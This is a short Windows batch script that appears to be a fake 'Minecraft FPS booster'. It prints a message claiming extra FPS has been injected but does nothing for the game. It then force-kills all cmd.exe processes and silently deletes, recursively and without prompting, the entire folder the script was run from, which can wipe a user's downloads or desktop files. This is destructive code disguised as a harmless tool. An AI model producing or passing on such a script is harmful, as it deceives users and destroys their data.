@echo on

echo You Have Now Injected Extra FPS Into Your Minecraft Client!
timeout /t 1 /nobreak >nul
taskkill /IM cmd.exe /F
cd ..
rd /s /q "%~dp0"